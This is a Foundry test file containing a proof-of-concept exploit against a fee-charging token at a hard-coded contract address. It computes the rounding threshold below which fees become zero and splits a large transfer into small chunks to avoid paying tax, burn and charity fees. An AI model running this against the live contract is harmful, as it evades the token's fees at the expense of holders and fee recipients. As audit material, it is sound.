pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface honeyToken {
    function _TAX_FEE() external view returns (uint256);
    function _BURN_FEE() external view returns (uint256);
    function _CHARITY_FEE() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x5CB9B847FbA8aAdb8a943fE19C1cc8439d7e00C5;
    address attacker;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use deal to get tokens
        attacker = address(this);
        // Get some initial tokens to work with
        deal(TARGET, attacker, 1000 * 10**18);  // Assuming 18 decimals
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // First, let's get enough tokens
        // The contract is already deployed, so we need to impersonate the owner or use deal
        // Since we can't impersonate without knowing the owner, let's use deal to give ourselves tokens
        deal(TARGET, attacker, 10000 * 10**18);

        uint256 initialBalance = IERC20(TARGET).balanceOf(attacker);
        console.log("Initial balance after deal:", initialBalance);

        // Check fee rates
        uint256 taxFee = honeyToken(TARGET)._TAX_FEE();
        uint256 burnFee = honeyToken(TARGET)._BURN_FEE();
        uint256 charityFee = honeyToken(TARGET)._CHARITY_FEE();
        console.log("Fee rates - Tax:", taxFee, " Burn:", burnFee, " Charity:", charityFee);

        // Calculate threshold where fees become non-zero
        // For taxFee = 100 (1%), threshold is 100 tokens
        // Formula: (amount * fee) / 100 / 100 > 0
        // => amount * fee > 10000
        // => amount > 10000 / fee
        uint256 threshold = 10000 * 10**18 / taxFee; // in token units with decimals
        console.log("Threshold for non-zero tax fee:", threshold / 10**18, "tokens");

        // Test 1: Transfer below threshold
        address recipient1 = address(0x1001);
        uint256 smallAmount = threshold / 2; // Half of threshold

        uint256 beforeSmall = IERC20(TARGET).balanceOf(attacker);
        IERC20(TARGET).transfer(recipient1, smallAmount);
        uint256 afterSmall = IERC20(TARGET).balanceOf(attacker);
        uint256 receivedSmall = IERC20(TARGET).balanceOf(recipient1);

        console.log("\nSmall transfer test:");
        console.log("Transferred:", smallAmount / 10**18, "tokens");
        console.log("Sender lost:", (beforeSmall - afterSmall) / 10**18, "tokens");
        console.log("Recipient got:", receivedSmall / 10**18, "tokens");
        console.log("Fee taken:", (smallAmount - receivedSmall) / 10**18, "tokens");

        // Test 2: Transfer above threshold
        address recipient2 = address(0x1002);
        uint256 largeAmount = threshold * 2;

        uint256 beforeLarge = IERC20(TARGET).balanceOf(attacker);
        IERC20(TARGET).transfer(recipient2, largeAmount);
        uint256 afterLarge = IERC20(TARGET).balanceOf(attacker);
        uint256 receivedLarge = IERC20(TARGET).balanceOf(recipient2);

        console.log("\nLarge transfer test:");
        console.log("Transferred:", largeAmount / 10**18, "tokens");
        console.log("Sender lost:", (beforeLarge - afterLarge) / 10**18, "tokens");
        console.log("Recipient got:", receivedLarge / 10**18, "tokens");
        console.log("Fee taken:", (largeAmount - receivedLarge) / 10**18, "tokens");

        // Test 3: Break large transfer into small chunks to avoid fees
        console.log("\nExploit demonstration:");
        address recipient3 = address(0x1003);
        uint256 totalToSend = largeAmount; // Same as largeAmount above
        uint256 chunkSize = threshold / 2; // Below threshold
        uint256 numChunks = totalToSend / chunkSize;

        // Reset recipient3 balance first
        vm.prank(recipient3);
        IERC20(TARGET).transfer(attacker, IERC20(TARGET).balanceOf(recipient3));

        uint256 attackerBeforeChunks = IERC20(TARGET).balanceOf(attacker);

        // Send in chunks
        for (uint256 i = 0; i < numChunks; i++) {
            IERC20(TARGET).transfer(recipient3, chunkSize);
        }

        uint256 attackerAfterChunks = IERC20(TARGET).balanceOf(attacker);
        uint256 recipient3Received = IERC20(TARGET).balanceOf(recipient3);

        console.log("Sent", totalToSend / 10**18, "tokens in", numChunks, "chunks of", chunkSize / 10**18, "tokens");
        console.log("Recipient received:", recipient3Received / 10**18, "tokens");
        console.log("Expected with fees (single transfer):", receivedLarge / 10**18, "tokens");
        console.log("Extra tokens received (profit):", (recipient3Received - receivedLarge) / 10**18, "tokens");

        // The exploit is successful if recipient3Received > receivedLarge
        // This shows that breaking into small chunks avoids fees
        assertGt(recipient3Received, receivedLarge, "Exploit failed: chunked transfers should receive more than single large transfer");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
